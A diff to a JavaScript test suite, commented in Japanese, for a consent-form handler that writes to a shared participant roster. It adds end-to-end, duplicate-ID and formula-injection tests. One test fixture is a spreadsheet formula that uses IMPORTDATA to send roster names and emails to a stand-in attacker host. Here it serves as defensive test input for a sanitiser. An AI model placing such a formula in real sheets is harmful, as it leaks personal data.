@@ -441,9 +441,186 @@ console.log("\n§7 P-ID の形式判定");
   const ctx = makeCtx();
   check(ctx.g1IsValidPid_("P015") === true, "P015 は妥当");
   check(ctx.g1IsValidPid_("p015") === true, "小文字も妥当（★ 大文字化して判定）");
+  // ⚠️★★ **この検査の限界を固定する。** `^P\d+$` は**桁数を見ない**ので `P15` を通す。
+  //   ★ O1 のコメントは `P15` を打ち間違いの例に挙げているが、⚠️ 実際には捕まえていない
+  //     （2026-09-01 に実測）。→ 捕まえるのは「P が無い」「区切りが入る」形だけである。
+  check(ctx.g1IsValidPid_("P15") === true, "⚠️ P15 は **通ってしまう**（★ 桁数を見ない・既知の限界）");
+  check(ctx.g1IsValidPid_("015") === false, "015（P が無い）は妥当でない");
+  check(ctx.g1IsValidPid_("p-015") === false, "p-015（区切りあり）は妥当でない");
   check(ctx.g1IsValidPid_("") === false, "空欄は妥当でない");
   check(ctx.g1IsValidPid_("まだ") === false, "日本語は妥当でない");
   check(ctx.g1IsValidPid_("P-ID") === false, "見出し行の値は妥当でない");
+}
+
+// ============================================================
+// §8 ⚠️★★★ 結合 — `onG1ConsentSubmit` を**端から端まで**通す
+// ============================================================
+// ⚠️ 最初この検査が無かったため、**リファクタ本体が 1 行も実行されていなかった**
+//   (code-reviewer 指摘 M1 / security-checker MED-3・2026-09-01)。
+//   ★ H1 (空 P-ID 行の埋め戻し) / H2 (形式検証) / H3 (重複時に送る) はすべてこの関数の中にあり、
+//   ⚠️ **テストが緑なのにコードが壊れている**組み合わせが実際に成立していた。
+console.log("\n§8 onG1ConsentSubmit を端から端まで通す");
+
+/** ★ 同意フォームの提出イベントを模す。⚠️ 実装は `g1ConsentAnswers_` で読む。 */
+function submitCtx(roster, opts) {
+  opts = opts || {};
+  const sent = [];
+  const notes = [];
+  const ctx = makeCtx({ sheets: { 参加者ロスター: roster } });
+  // ⚠️★ 備考に**何を書いたか**を捕まえる。★ これが無いと「嘘を書く」欠陥を測れない
+  //   （実測: outcome を固定文に戻す変異が緑のまま素通りした）。
+  ctx.__notes = notes;
+  ctx.g1RecordRosterConflict_ = (found, email, outcome) => {
+    notes.push(String(outcome == null ? "" : outcome));
+    return true;
+  };
+  ctx.MailApp.sendEmail = (to, sub, body) => sent.push({ to, sub, body });
+  ctx.GmailApp.createDraft = (to, sub, body) => sent.push({ to, sub, body, draft: true });
+  ctx.__sent = sent;
+  // ★ 回答の読み取りと本文生成は本タスクの対象外なのでスタブする
+  //   （⚠️ ここを本物にすると設問 ID の有無で落ち、測りたいものが測れない）。
+  ctx.g1ConsentAnswers_ = () => ({
+    email: opts.email || "",
+    pid: opts.pid === undefined ? "" : opts.pid,
+    name: opts.name || "名無し",
+    consent: true,
+  });
+  ctx.g1RegisterAckSubject_ = () => "受付";
+  ctx.g1RegisterAckBody_ = () => "本文";
+  ctx.g1MaterialsUrlForPid_ = () => ({ url: "", problem: "なし" });
+  ctx.g1EnsureRunRow_ = () => null;
+  ctx.g1IsConsentYes_ = () => true;
+  return ctx;
+}
+
+{
+  // ★ H1: P-ID が空でメールが一致する行 → **その行を埋める**（⚠️ 2 行目を作らない）
+  const roster = makeSheet([
+    ["P-ID", "氏名", "メール"],
+    ["P014", "先客", "x@example.com"],
+    ["", "D", "d@example.com"], // ★ 氏名・メールだけ先に入った行
+  ]);
+  const ctx = submitCtx(roster, { email: "d@example.com", pid: "" });
+  try {
+    ctx.onG1ConsentSubmit({ response: {} });
+  } catch (e) {
+    /* 本体の他の経路で落ちても、下の実測で判定する */
+  }
+  check(roster.__rows.length === 3, "⚠️ 行が増えていない（★ 2 行目を作らない = 1 人に 2 つの ID を作らない）");
+  check(String(roster.__rows[2][0]).trim() === "P015", "★ 空だった P-ID 列が埋まった（P015）");
+}
+
+{
+  // ★ H2: 形式不正な申告 ID → **何もしない**
+  const roster = makeSheet([
+    ["P-ID", "氏名", "メール"],
+    ["P014", "先客", "x@example.com"],
+  ]);
+  // ⚠️★ `015`（P が無い）を使う。★ `P15` は **通る** —— `^P\d+$` は桁数を見ないため
+  //   （実測。O1 のコメントは `P15` を打ち間違いの例に挙げているが、⚠️ この検査は捕まえない）。
+  const ctx = submitCtx(roster, { email: "new@example.com", pid: "015" });
+  ctx.onG1ConsentSubmit({ response: {} });
+  check(roster.__rows.length === 2, "⚠️ 形式不正なら **1 行も書かない**");
+  check(ctx.__sent.length === 0, "⚠️ 形式不正なら **受付メールを送らない**");
+  check(
+    ctx.__logs.some((l) => l.indexOf("形式が違います") >= 0),
+    "★ 形式不正を黙らせない"
+  );
+}
+
+{
+  // ★ conflict: 他人の P-ID を名乗る → 発番も送信もしない
+  const roster = makeSheet([
+    ["P-ID", "氏名", "メール"],
+    ["P015", "A", "a@example.com"],
+  ]);
+  const ctx = submitCtx(roster, { email: "b@example.com", pid: "P015" });
+  ctx.onG1ConsentSubmit({ response: {} });
+  check(roster.__rows.length === 2, "⚠️ conflict なら **ロスターに 1 行も書かない**");
+  check(ctx.__sent.length === 0, "⚠️ conflict なら **受付メールを 0 通**（★ 端から端まで実測）");
+}
+
+{
+  // ★ H3: 重複を検知したら **受付メールを送らない**
+  const roster = makeSheet([
+    ["P-ID", "氏名", "メール"],
+    ["P014", "先客", "x@example.com"],
+  ]);
+  const ctx = submitCtx(roster, { email: "new@example.com", pid: "" });
+  // ⚠️ appendRow の直後に「もう 1 行同じ ID がある」状態を作る（★ O1 が並行して書いた相当）。
+  const origAppend = roster.appendRow;
+  roster.appendRow = function (r) {
+    origAppend.call(roster, r);
+    origAppend.call(roster, [r[0], "他プロジェクトが書いた行", "z@example.com"]);
+  };
+  ctx.onG1ConsentSubmit({ response: {} });
+  check(
+    ctx.__sent.length === 0,
+    "⚠️★★★ 重複を検知したら **受付メールを送らない**（★ 重複 ID は回収できない）"
+  );
+  check(
+    ctx.__logs.some((l) => l.indexOf("受付メールは**送っていません**") >= 0),
+    "★ 送らなかったことをログに残す"
+  );
+  // ⚠️★★★ **備考に嘘を書いていないこと。** 初版は固定文「発番も受付メールもしていません」を
+  //   書いていたが、★ この経路では **発番済み**であり、⚠️ 研究者の見るシートに嘘が載っていた
+  //   (code-reviewer 指摘 H3)。★ 「警告が無い＝安全」の裏返しで、**虚偽の安心**である。
+  //   ⚠️ この検査が無いと、固定文へ戻す変異が**緑のまま素通りする**（実測して足した）。
+  const conflictLogs = ctx.__logs.filter((l) => l.indexOf("conflict を") >= 0).join("\n");
+  const wroteLie = ctx.__notes.some((n) => n.indexOf("発番も受付メールもしていません") >= 0);
+  check(!wroteLie, "⚠️★★★ 備考に「発番も受付メールもしていません」という **嘘を書かない**");
+  check(
+    ctx.__notes.some((n) => n.indexOf("発番は済んでいます") >= 0),
+    "★ 備考に「発番は済んでいる」と **本当のことを書く**"
+  );
+  void conflictLogs;
+}
+
+{
+  // ★ 陰性対照: 正常な新規登録では **1 通送る**（⚠️ 全部止める実装でも緑にならないように）
+  const roster = makeSheet([
+    ["P-ID", "氏名", "メール"],
+    ["P014", "先客", "x@example.com"],
+  ]);
+  const ctx = submitCtx(roster, { email: "new@example.com", pid: "" });
+  ctx.onG1ConsentSubmit({ response: {} });
+  check(roster.__rows.length === 3, "★ 正常な新規登録では 1 行増える（陰性対照）");
+  check(ctx.__sent.length === 1, "★ 正常な新規登録では **受付メールを 1 通送る**（陰性対照）");
+  check(String(roster.__rows[2][0]).trim() === "P015", "★ 新規は P015 になる");
+}
+
+// ============================================================
+// §9 ⚠️★★★ 数式インジェクション — 共用ロスターへ生値を書かない
+// ============================================================
+// ⚠️ 氏名欄は自由記入。`=IMPORTDATA("…"&TEXTJOIN(",",1,B2:C200))` を書かれると、
+//   ★ **研究者がロスターを開いた瞬間**に Phase1 / G1 / O1 共用の対応表が外部へ出る。
+//   (security-checker 指摘 HIGH-2・2026-09-01。O1 は `o1PlainText_` で対策済みだった)
+console.log("\n§9 共用ロスターへの数式インジェクション");
+
+{
+  const ctx = makeCtx();
+  check(ctx.g1PlainText_("=IMPORTDATA(\"x\")").charAt(0) === "'", "= で始まる値を無害化する");
+  check(ctx.g1PlainText_("+1").charAt(0) === "'", "+ で始まる値を無害化する");
+  check(ctx.g1PlainText_("-1+1").charAt(0) === "'", "- で始まる値を無害化する");
+  check(ctx.g1PlainText_("@A1").charAt(0) === "'", "@ で始まる値を無害化する");
+  check(ctx.g1PlainText_("山田 太郎") === "山田 太郎", "★ 普通の氏名は変えない（陰性対照）");
+  check(ctx.g1PlainText_("a@example.com") === "a@example.com", "★ 普通のメールは変えない（陰性対照）");
+}
+
+{
+  // ★ 端から端まで: 実際に提出させて、ロスターに数式のまま着地しないこと
+  const roster = makeSheet([
+    ["P-ID", "氏名", "メール"],
+    ["P014", "先客", "x@example.com"],
+  ]);
+  const evil = '=IMPORTDATA("https://evil.example/x?d="&TEXTJOIN(",",1,B2:C200))';
+  const ctx = submitCtx(roster, { email: "new@example.com", pid: "", name: evil });
+  ctx.onG1ConsentSubmit({ response: {} });
+  const written = String(roster.__rows[2] && roster.__rows[2][1]);
+  check(
+    written.charAt(0) === "'",
+    "⚠️★★★ 氏名欄の数式が **無害化されてロスターに着地する**（★ 対応表の流出経路を塞ぐ）"
+  );
 }
 
 // ============================================================
@@ -455,7 +632,7 @@ if (fail > 0) {
   process.exit(1);
 }
 // ⚠️★ 検査が 1 件も走っていないのに緑になるのを防ぐ（★ 空回りの番兵）。
-if (pass < 25) {
+if (pass < 50) {
   console.log("  ❌ ★ 通過件数が少なすぎます（" + pass + " 件）。検査が読み込めていない疑い。");
   process.exit(1);
 }
